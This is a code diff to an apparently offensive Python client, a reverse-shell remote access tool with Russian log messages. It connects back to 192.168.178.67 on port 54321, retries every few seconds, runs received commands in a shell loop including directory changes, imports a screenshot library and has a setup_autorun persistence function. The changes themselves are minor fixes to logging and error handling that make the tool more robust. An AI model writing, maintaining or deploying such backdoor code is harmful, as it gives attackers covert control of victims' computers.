@@ -12,7 +12,13 @@ import requests
 from mss import mss
 import logging
 
-logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s", filename="client_log.txt", filemode="a")
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(message)s",
+    filename="client_log.txt",
+    filemode="a",
+)
+
 
 def reliable_send(data, sock):
     try:
@@ -21,6 +27,7 @@ def reliable_send(data, sock):
         logging.info(f"Отправлено: {data}")
     except Exception as e:
         logging.error(f"Ошибка при отправке данных: {e}")
+
 
 def reliable_recv(sock):
     json_data = b""
@@ -119,7 +126,7 @@ def shell(sock):
                 sock.close()
                 logging.info("[+] Клиент закрыт")
                 sys.exit(0)
-                
+
             elif command.startswith("cd"):
                 try:
                     os.chdir(command[3:])
@@ -158,9 +165,12 @@ def connection():
             sock.connect(("192.168.178.67", 54321))
             logging.info("[+] Успешное подключение к серверу")
             shell(sock)
-        except socket.error:
+        except socket.error as e:
             logging.error(f"[!!] Ошибка подключения: {e}")
             time.sleep(5)
+        except Exception as e:
+            logging.error(f"[!!] Ошибка в connection: {e}")
+            break
 
 
 def setup_autorun():
